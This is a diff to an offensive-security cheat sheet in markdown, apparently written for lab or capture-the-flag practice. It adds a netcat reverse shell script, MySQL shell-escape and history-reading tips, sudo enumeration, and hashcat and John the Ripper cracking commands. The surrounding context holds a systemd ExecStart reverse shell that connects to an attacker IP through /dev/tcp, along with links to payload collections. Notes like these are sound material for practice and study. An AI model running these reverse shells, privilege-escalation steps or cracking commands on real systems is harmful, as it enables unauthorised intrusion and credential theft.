@@ -23,19 +23,43 @@ wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlist
 ### Enum4Linux
 ``` enum4linux 192.168.x.x ```
 
-
-## Password Cracking
-
-### hashcat
+### Log Files
 ```
-#If md5 hash is found
-hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt 
+#Look for cron jobs being recorded in log files.  A cron job may run a certain named file every 5 secondso or so.
+#Log file may be output of pspy instance -> Use to find vulnerable folder or file
+
+e.g 2019/09/10 15:25:02 ^[[31;1mCMD: UID=0    PID=796    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control ^[[0m
+2019/09/10 15:25:02 ^[[31;1mCMD: UID=1000 PID=803    | /bin/sh -c /home/dawn/ITDEPT/product-control ^[[0m
+2019/09/10 15:26:01 ^[[31;1mCMD: UID=0    PID=809    | /usr/sbin/CRON -f ^[[0m
+
+In this example product control is a cron job, and is given permissions to run.
+Lists the processes that are being launched in real time, including processes owned by root.
 ```
+
+
+
 
 ## Escalate Privileges
 
 ### Backup File
-``` ls -lah in backup files to find readable items ```
+```Navigate to user directory and use ls -lah in backup files to find readable items
+# Look for;
+- processes run as root
+- hashed passwords
+- any processes that give you root access after running
+```
+### Find execute privileges for user currently logged in
+``` sudo -l ```
+### MySQL 
+```
+# Spawn a shell from \!sh mySql - sudo mysql -u root -p
+# Check mysql history for login details - cat .mysql_history'
+
+ ```
+
+
+
+
 
 
 
@@ -47,6 +71,11 @@ hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt
 #Payload Links
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config
 
+### Low Privilege Reverse Shell
+```
+#!/bin/bash
+nc -e /bin/sh 192.168.x.x 4444
+```
 ### ExecStart exploit
 ``` ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'
 # To file: echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'" >> /tmp/wrapper.sh
@@ -55,10 +84,18 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecur
 https://github.com/pentestmonkey/php-reverse-shell
 
 
+## Password Cracking
+https://www.tunnelsup.com/hash-analyzer/
 
-
-
-
+### hashcat
+```
+#If md5 hash is found
+hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt 
+```
+### John the ripper
+```
+john hash --wordlist=/user/share/wordlists/rockyou.txt --format=md5crypt
+```
 
 ## Helpful tools
 
@@ -87,7 +124,7 @@ sudo systemctl restart service_name.service
 ```chmod 777 OR chmod 600```
 
 
-## Exploiting
+## Exploits- Specific Scenarios
 
 ### Web Applications
 - Remember to check service version and use https://www.exploit-db.com/ to find vulnerabilities
